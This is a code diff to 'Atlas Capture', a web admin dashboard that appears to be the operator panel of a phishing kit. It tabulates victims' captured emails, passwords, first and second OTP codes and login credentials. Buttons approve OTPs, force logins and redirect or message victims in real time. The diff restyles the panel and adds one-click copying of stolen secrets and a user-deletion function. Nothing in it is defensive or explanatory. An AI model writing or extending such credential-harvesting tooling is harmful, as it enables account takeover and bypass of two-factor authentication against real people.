@@ -6,97 +6,114 @@
 <title>Admin Dashboard - Atlas Capture</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif}
 
 body{
-  background:#f3f4f6;
+  background:#f8fafc;
 }
 
 .navbar{
   background:#fff;
-  padding:16px 24px;
+  padding:16px 32px;
   display:flex;
   justify-content:space-between;
   align-items:center;
-  box-shadow:0 1px 3px rgba(0,0,0,0.05);
-  border-bottom:1px solid #e5e7eb;
+  box-shadow:0 1px 2px rgba(0,0,0,0.05);
+  border-bottom:1px solid #e9eef3;
 }
 .navbar h1{
   font-size:20px;
   font-weight:600;
-  color:#1f2937;
+  color:#0f172a;
 }
 .logout-btn{
   background:#ef4444;
   color:white;
   border:none;
   padding:8px 20px;
-  border-radius:10px;
+  border-radius:8px;
   cursor:pointer;
   font-weight:500;
+  font-size:14px;
+  transition:all 0.2s;
+}
+.logout-btn:hover{
+  background:#dc2626;
 }
 
 .container{
   max-width:1400px;
   margin:24px auto;
-  padding:0 20px;
+  padding:0 24px;
 }
 
 .stats{
   display:grid;
-  grid-template-columns:repeat(auto-fit,minmax(200px,1fr));
-  gap:16px;
-  margin-bottom:24px;
+  grid-template-columns:repeat(auto-fit,minmax(240px,1fr));
+  gap:20px;
+  margin-bottom:28px;
 }
 .stat-card{
   background:#fff;
-  padding:20px;
-  border-radius:16px;
-  border:1px solid #e5e7eb;
+  padding:20px 24px;
+  border-radius:20px;
+  border:1px solid #e9eef3;
+  box-shadow:0 1px 2px rgba(0,0,0,0.03);
 }
 .stat-card h3{
   font-size:13px;
-  color:#6b7280;
+  font-weight:500;
+  color:#64748b;
   margin-bottom:8px;
+  text-transform:uppercase;
+  letter-spacing:0.5px;
 }
 .stat-card .number{
   font-size:32px;
   font-weight:700;
-  color:#4f46e5;
+  color:#0f172a;
 }
 
 .table-container{
   background:#fff;
-  border-radius:16px;
-  border:1px solid #e5e7eb;
+  border-radius:20px;
+  border:1px solid #e9eef3;
   overflow-x:auto;
+  box-shadow:0 1px 2px rgba(0,0,0,0.03);
 }
 table{
   width:100%;
   border-collapse:collapse;
-  min-width:1400px;
+  min-width:1300px;
 }
 th{
   text-align:left;
-  padding:16px;
-  background:#f9fafb;
+  padding:16px 20px;
+  background:#f8fafc;
   font-weight:600;
-  color:#374151;
-  border-bottom:1px solid #e5e7eb;
+  font-size:13px;
+  color:#475569;
+  border-bottom:1px solid #e9eef3;
 }
 td{
-  padding:14px 16px;
-  border-bottom:1px solid #f0f0f0;
-  color:#4b5563;
+  padding:14px 20px;
+  border-bottom:1px solid #f1f5f9;
+  color:#334155;
+  font-size:13px;
   vertical-align:middle;
 }
+tr:hover{
+  background:#fafcff;
+}
+
 .badge{
   display:inline-block;
   padding:4px 10px;
   border-radius:20px;
-  font-size:12px;
+  font-size:11px;
   font-weight:500;
 }
 .badge-pending{background:#fef3c7;color:#d97706;}
@@ -104,12 +121,14 @@ td{
 .badge-waiting{background:#e0e7ff;color:#4f46e5;}
 .badge-email{background:#fef3c7;color:#d97706;}
 
-/* FIXED BUTTON STYLES - ALL IN ONE ROW */
-.actions-cell {
-  white-space: nowrap;
+/* Action Buttons */
+.actions-cell{
+  white-space:nowrap;
 }
-.action-btn {
-  display: inline-block;
+.action-btn{
+  display:inline-flex;
+  align-items:center;
+  gap:6px;
   padding:6px 12px;
   border-radius:8px;
   cursor:pointer;
@@ -118,7 +137,7 @@ td{
   margin-right:6px;
   border:none;
   transition:all 0.2s;
-  white-space: nowrap;
+  white-space:nowrap;
 }
 .approve-email-btn{
   background:#f59e0b;
@@ -140,6 +159,10 @@ td{
   background:#f97316;
   color:white;
 }
+.delete-user-btn{
+  background:#ef4444;
+  color:white;
+}
 .waiting-badge{
   background:#e0e7ff;
   color:#4f46e5;
@@ -148,25 +171,48 @@ td{
   font-size:12px;
   font-weight:500;
   display:inline-block;
-  white-space: nowrap;
+  white-space:nowrap;
 }
 .action-btn:hover{
   transform:translateY(-1px);
   opacity:0.9;
 }
-.copy-btn{
-  background:#6b7280;
-  color:white;
+
+/* Copy Button - Clean Icon Only */
+.copy-icon{
+  background:transparent;
   border:none;
-  padding:4px 8px;
-  border-radius:6px;
   cursor:pointer;
-  font-size:11px;
-  font-weight:500;
+  font-size:12px;
+  color:#94a3b8;
+  padding:4px;
+  border-radius:6px;
+  transition:all 0.2s;
   margin-left:6px;
 }
-.copy-btn:hover{
-  background:#4b5563;
+.copy-icon:hover{
+  color:#4f46e5;
+  background:#eef2ff;
+}
+
+/* Data Cell Styling */
+.data-value{
+  display:inline-flex;
+  align-items:center;
+  gap:4px;
+  flex-wrap:wrap;
+}
+.data-code{
+  font-family:monospace;
+  background:#f1f5f9;
+  padding:4px 8px;
+  border-radius:6px;
+  font-size:12px;
+  color:#0f172a;
+}
+.data-empty{
+  color:#94a3b8;
+  font-size:12px;
 }
 
 .notification-toast{
@@ -175,7 +221,7 @@ td{
   right:20px;
   background:#fff;
   border-left:4px solid #4f46e5;
-  padding:16px 20px;
+  padding:14px 20px;
   border-radius:12px;
   box-shadow:0 10px 25px rgba(0,0,0,0.1);
   display:none;
@@ -321,12 +367,12 @@ td{
           <th>Login Password</th>
           <th>Status</th>
           <th>Actions</th>
-          </tr>
+            </tr>
       </thead>
       <tbody id="usersTableBody">
-        <tr><td colspan="8" style="text-align:center; padding:40px;">Loading...</td></tr>
+        <tr><td colspan="8" style="text-align:center; padding:40px;">Loading...<\/td><\/tr>
       </tbody>
-        </table>
+        <\/table>
   </div>
 </div>
 
@@ -423,14 +469,15 @@ td{
     Notification.requestPermission();
   }
 
+  // Copy to clipboard - Clean icon only
   function copyToClipboard(text, fieldName) {
+    if (!text || text === '-') return;
     navigator.clipboard.writeText(text).then(() => {
-      showNotification('Copied!', `${fieldName} copied to clipboard`, 'otp');
-    }).catch(() => {
-      alert('Failed to copy');
-    });
+      showNotification('Copied!', `${fieldName} copied`, 'otp');
+    }).catch(() => {});
   }
 
+  // Send Text Modal Functions
   function showTextModal(email) {
     currentSelectedEmail = email;
     document.getElementById('adminTextInput').value = '';
@@ -499,6 +546,33 @@ td{
     }
   }
 
+  // Delete User Function
+  async function deleteUser(email) {
+    if (confirm(`⚠️ Are you sure you want to permanently delete user: ${email}?\n\nThis action cannot be undone.`)) {
+      showNotification('Deleting User', `Deleting ${email}...`, 'email');
+      try {
+        const response = await fetch('/api/admin/delete-user', {
+          method: 'POST',
+          headers: { 
+            'Content-Type': 'application/json', 
+            'Authorization': `Bearer ${token}` 
+          },
+          body: JSON.stringify({ email })
+        });
+        const data = await response.json();
+        if (data.success) {
+          showNotification('User Deleted', `${email} has been removed`, 'success');
+          loadUsers();
+        } else {
+          showNotification('Error', data.error || 'Failed to delete user', 'email');
+        }
+      } catch (error) {
+        console.error('Delete user error:', error);
+        showNotification('Error', 'Network error', 'email');
+      }
+    }
+  }
+
   async function loadUsers() {
     try {
       const response = await fetch('/api/admin/users', {
@@ -525,10 +599,32 @@ td{
     document.getElementById('activeSecondUsers').textContent = activeSecondUsers;
   }
 
+  function formatValue(value, fieldName) {
+    if (!value) return '<span class="data-empty">—</span>';
+    return `
+      <div class="data-value">
+        <span class="data-code">${escapeHtml(value)}</span>
+        <button class="copy-icon" onclick="copyToClipboard('${escapeHtml(value).replace(/'/g, "\\'")}', '${fieldName}')" title="Copy ${fieldName}">
+          <i class="far fa-copy"></i>
+        </button>
+      </div>
+    `;
+  }
+
+  function escapeHtml(str) {
+    if (!str) return '';
+    return str.replace(/[&<>]/g, function(m) {
+      if (m === '&') return '&amp;';
+      if (m === '<') return '&lt;';
+      if (m === '>') return '&gt;';
+      return m;
+    });
+  }
+
   function displayUsers(users) {
     const tbody = document.getElementById('usersTableBody');
     if (!users.length) {
-      tbody.innerHTML = '<tr><td colspan="8" style="text-align:center; padding:40px;">No users</td></tr>';
+      tbody.innerHTML = '<tr><td colspan="8" style="text-align:center; padding:40px; color:#94a3b8;">No users found<\/td><\/tr>';
       return;
     }
     
@@ -538,33 +634,32 @@ td{
       
       if (!user.approved) {
         statusBadge = '<span class="badge badge-email">⏳ Pending Email Approval</span>';
-        actionButtons = `<button class="action-btn approve-email-btn" onclick="approveEmail('${user.email}')">📧 Approve Email</button>`;
+        actionButtons = `<button class="action-btn approve-email-btn" onclick="approveEmail('${user.email}')"><i class="fas fa-envelope"></i> Approve Email</button>`;
       } else if (user.approved && !user.otp) {
         statusBadge = '<span class="badge badge-waiting">✅ Email Approved - Waiting for First OTP</span>';
-        actionButtons = '<span class="waiting-badge">Waiting for user</span>';
+        actionButtons = '<span class="waiting-badge"><i class="fas fa-clock"></i> Waiting for user</span>';
       } else if (user.approved && user.otp) {
         statusBadge = '<span class="badge badge-waiting">🔐 Ready for Second OTP Approval</span>';
         actionButtons = `
-          <button class="action-btn approve-second-btn" onclick="approveSecond('${user.email}')">🔐 Approve Current OTP</button>
-          <button class="action-btn force-login-btn" onclick="forceLogin('${user.email}')">🔒 Force Login</button>
-          <button class="action-btn redirect-success-btn" onclick="redirectToSuccess('${user.email}')">🎉 Redirect to Success</button>
-          <button class="action-btn send-text-btn" onclick="showTextModal('${user.email}')">📝 Send Text</button>
+          <button class="action-btn approve-second-btn" onclick="approveSecond('${user.email}')"><i class="fas fa-check-circle"></i> Approve Current OTP</button>
+          <button class="action-btn force-login-btn" onclick="forceLogin('${user.email}')"><i class="fas fa-sign-in-alt"></i> Force Login</button>
+          <button class="action-btn redirect-success-btn" onclick="redirectToSuccess('${user.email}')"><i class="fas fa-arrow-right"></i> Redirect to Success</button>
+          <button class="action-btn send-text-btn" onclick="showTextModal('${user.email}')"><i class="fas fa-paper-plane"></i> Send Text</button>
+          <button class="action-btn delete-user-btn" onclick="deleteUser('${user.email}')"><i class="fas fa-trash-alt"></i> Delete</button>
         `;
       } else {
         statusBadge = '<span class="badge badge-pending">Pending</span>';
         actionButtons = '';
       }
       
-      const copyBtn = (value, field) => value ? `<button class="copy-btn" onclick="copyToClipboard('${value.replace(/'/g, "\\'")}', '${field}')">📋 Copy</button>` : '';
-      
       return `
         <tr>
-          <td><strong>${user.email}</strong> ${copyBtn(user.email, 'Email')}</td>
-          <td><code>${user.password || '-'}</code> ${copyBtn(user.password, 'Password')}</td>
-          <td>${user.otp ? `<span class="badge badge-waiting">${user.otp}</span> ${copyBtn(user.otp, 'First OTP')}` : '<span class="badge badge-pending">-</span>'}</td>
-          <td>${user.second_otp ? `<span class="badge badge-waiting">${user.second_otp}</span> ${copyBtn(user.second_otp, 'Second OTP')}` : '<span class="badge badge-pending">-</span>'}</td>
-          <td>${user.login_email ? `<code>${user.login_email}</code> ${copyBtn(user.login_email, 'Login Email')}` : '<span class="badge badge-pending">-</span>'}</td>
-          <td>${user.login_password ? `<code>${user.login_password}</code> ${copyBtn(user.login_password, 'Login Password')}` : '<span class="badge badge-pending">-</span>'}</td>
+          <td>${formatValue(user.email, 'Email')}</td>
+          <td>${formatValue(user.password, 'Password')}</td>
+          <td>${user.otp ? formatValue(user.otp, 'First OTP') : '<span class="data-empty">—</span>'}</td>
+          <td>${user.second_otp ? formatValue(user.second_otp, 'Second OTP') : '<span class="data-empty">—</span>'}</td>
+          <td>${user.login_email ? formatValue(user.login_email, 'Login Email') : '<span class="data-empty">—</span>'}</td>
+          <td>${user.login_password ? formatValue(user.login_password, 'Login Password') : '<span class="data-empty">—</span>'}</td>
           <td>${statusBadge}</td>
           <td class="actions-cell">${actionButtons}</td>
         </tr>
@@ -689,6 +784,10 @@ td{
   });
   socket.on('text-sent', (data) => {
     showNotification('📝 Text Sent', `${data.email} - Message sent`, 'otp');
+    loadUsers();
+  });
+  socket.on('user-deleted', (data) => {
+    showNotification('🗑️ User Deleted', `${data.email} was removed from system`, 'email');
     loadUsers();
   });
 
